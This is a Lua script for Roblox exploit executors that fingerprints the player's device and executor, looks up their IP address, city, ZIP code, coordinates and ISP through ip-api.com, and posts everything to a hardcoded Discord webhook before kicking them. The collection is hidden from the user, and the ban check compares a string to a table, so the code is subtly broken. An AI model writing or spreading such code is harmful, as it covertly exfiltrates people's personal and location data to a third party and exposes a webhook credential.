local Http = game:GetService("HttpService")
local Plrs = game:GetService("Players")
local RAS = game:GetService("RbxAnalyticsService")
local UIS = game:GetService("UserInputService")
local lp = Plrs.LocalPlayer

local bannedclientids = {
    ""
}
local hook = "https://discord.com/api/webhooks/1361570999354527826/Z7RoX24SRG5Z7uaVFaN4I9XxIlqGpnG0XZxUbRzoIs3XcFJYuzvKhYGkpwD-ipJir7rT"

--// Fast HTTP fallback
local function req(opt)
	for _, f in pairs({syn and syn.request, http and http.request, request, fluxus and fluxus.request, krnl and krnl.request}) do
		if typeof(f) == "function" then
			local s, r = pcall(f, opt)
			if s and r and r.Body then return r.Body end
		end
	end
end

local function getIP()
	local r = req({
		Url = "http://ip-api.com/json/",
		Method = "GET",
		Headers = {["Content-Type"] = "application/json", ["User-Agent"] = "Mozilla/5.0"}
	})
	if r then
		local ok, data = pcall(function() return Http:JSONDecode(r) end)
		if ok then return data end
	end
	return {}
end

local function getHWID()
	local id = "Unavailable"
	pcall(function() id = RAS:GetClientId() end)
	return id
end

local function getExec()
	for _, d in ipairs({
		{function() return identifyexecutor end, identifyexecutor and identifyexecutor() or nil},
		{function() return getexecutorname end, getexecutorname and getexecutorname() or nil},
		{function() return syn and syn.protect_gui end, "Synapse X"},
		{function() return is_sirhurt_closure end, "SirHurt"},
		{function() return isexecutorclosure end, "Script-Ware"},
		{function() return secure_load end, "Sentinel"},
		{function() return pebc_execute end, "Proxo"},
		{function() return KRNL_LOADED end, "KRNL"},
		{function() return fluxus or is_fluxus_closure end, "Fluxus"},
		{function() return wrapfunction and isreadonly end, "Electron"},
		{function() return get_hidden_ui end, "Dansploit"},
		{function() return shadow_env end, "Shadow"},
		{function() return hookmetamethod and getrenv and getgenv end, "Arceus X"},
		{function() return isourclosure and hookfunction end, "Velocity"},
		{function() return is_synapse_function and checkcaller end, "Swift"},
		{function() return gethiddengui end, "Comet"},
		{function() return cloneref and hookfunction and checkcaller end, "Trigon"},
		{function() return gethui and not syn and not fluxus and not KRNL_LOADED end, "Delta"},
		{function() return getinstance end, "JJSploit"},
		{function() return mimikatz end, "WeAreDevs API"},
		{function() return getnilinstances and setfflag and getreg end, "Skisploit"},
		{function() return rawisexecutor end, "Ronix"},
	}) do
		if pcall(d[1]) and d[1]() then return d[2] or "Unknown" end
	end
	return "Unknown"
end

local function getEnv()
	local plat = "Unknown"
	pcall(function()
		plat = tostring(UIS:GetPlatform()):gsub("^Enum%.Platform%.", "")
	end)
	return {
		platform = plat,
		touch = tostring(UIS.TouchEnabled),
		mem = tostring(collectgarbage("count")),
		rver = tostring(game:GetEngineFeature("Version")),
		pid = tostring(game.PlaceId),
		jid = tostring(game.JobId),
		ct = tostring(game.CreatorType),
		cid = tostring(game.CreatorId)
	}
end

local function alert(data)
	local f = syn and syn.request or http and http.request or request or fluxus and fluxus.request or krnl and krnl.request
	if f then
		pcall(function()
			f({
				Url = hook,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = Http:JSONEncode(data)
			})
		end)
	end
	task.wait(1.5)
	lp:Kick("YOU ARE BANNED FROM POLLESER SCRIPTS, TO MAKE APPEAL PLEASE MAKE A TICKET!")
end

local hwid = getHWID()
if hwid == bannedclientids then
	local ip = getIP()
	local env = getEnv()
	local exec = getExec()

	alert({
		embeds = {{
			title = "BANNED USER RAN SCRIPT!",
			color = 16711680,
			fields = {
				{name="Username",value=lp.Name,inline=true},
				{name="UserId",value=tostring(lp.UserId),inline=true},
				{name="HWID",value=hwid,inline=false},
				{name="Executor",value=exec,inline=true},
				{name="Platform",value=env.platform,inline=true},
				{name="Touch",value=env.touch,inline=true},
				{name="Lua Mem",value=env.mem,inline=true},
				{name="Timezone",value=ip.timezone or "Unknown",inline=true},
				{name="Country",value=ip.country or "Unknown",inline=true},
				{name="Region",value=ip.regionName or "Unknown",inline=true},
				{name="City",value=ip.city or "Unknown",inline=true},
				{name="ZIP",value=ip.zip or "Unknown",inline=true},
				{name="Lat/Lon",value=tostring(ip.lat)..", "..tostring(ip.lon),inline=false},
				{name="ISP",value=ip.isp or "Unknown",inline=true},
				{name="Org",value=ip.org or "Unknown",inline=true},
				{name="AS",value=ip.as or "Unknown",inline=true},
				{name="IP",value=ip.query or "Unknown",inline=false},
			}
		}}
	})
end
